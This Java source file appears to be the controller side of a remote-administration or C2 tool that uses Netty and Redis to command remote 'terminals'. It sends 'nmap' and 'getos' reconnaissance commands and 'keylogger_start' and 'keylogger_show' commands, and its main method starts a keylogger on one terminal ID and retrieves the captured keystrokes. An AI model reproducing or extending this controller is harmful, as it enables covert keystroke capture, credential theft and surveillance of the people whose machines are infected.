package service;


import java.net.UnknownHostException;

import Config.Config;
import io.netty.channel.Channel;
import io.netty.channel.ChannelId;
import io.netty.channel.group.ChannelGroup;
import netty.NettyServerBootstrap;
import org.junit.Test;
import redis.RedisUtil;

public class ControlService implements ControlServiceImp {
    private NettyServerBootstrap bootstrap;
    private RedisUtil redisUtil;


    public ControlService() throws InterruptedException {
        init();
    }


    @Override
    public void init() throws InterruptedException {
        bootstrap = new NettyServerBootstrap(Config.NettyPort);
        redisUtil = new RedisUtil();
    }

    @Override
    public void sendMesgToTerminal(Channel channel, String msg) {
        channel.writeAndFlush(msg);
    }

    @Override
    public Channel getChannel(ChannelId id, ChannelGroup group) {
        return group.find(id);
    }

    @Override
    public void sendMesg(String terminalId, String msg) {

        Channel channel = getChannel(bootstrap.getMesgHandler().getSingleId(), bootstrap.getChannelGroup());
        sendMesgToTerminal(channel, msg);
    }

    @Override
    public ChannelId findChannelIdFromTerminalId(long terminalId) {
        return null;
    }

    @Override
    public boolean runNmap(String terminalID) {
        sendMesg(terminalID, "nmap");
        return true;
    }

    @Override
    public String runGetos(String terminalID) {
        sendMesg(terminalID, "getos");
        return null;
    }

    @Override
    public String getGetos(String terminalID) {
        System.out.println(redisUtil.getTerminalOsinfo(terminalID));
        return redisUtil.getTerminalOsinfo(terminalID);
    }

    @Override
    public String startKeyLogger(String terminalID) {
        sendMesg(terminalID, "keylogger_start");
        redisUtil.setTerminalKeyLoggerStatus(terminalID, "" + -1);
        redisUtil.setTerminalKeyLoggerInfo(terminalID, "-1");
        try {
            Thread.sleep(3 * 1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        return redisUtil.getTerminalKeyLoggerStatus(terminalID);
    }

    @Override
    public String overKeyLogger(String terminalID) {
        sendMesg(terminalID, "keylogger_show");
        try {
            Thread.sleep(2 * 1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        return redisUtil.getTerminalKeyLoggerInfo(terminalID);
    }


    public static void main(String[] args) throws InterruptedException, UnknownHostException {
        ControlService controlService = new ControlService();
        Thread.sleep(1 * 1000);
        controlService.startKeyLogger("38086cf5");
        Thread.sleep(10 * 1000);
        controlService.overKeyLogger("38086cf5");

    }

}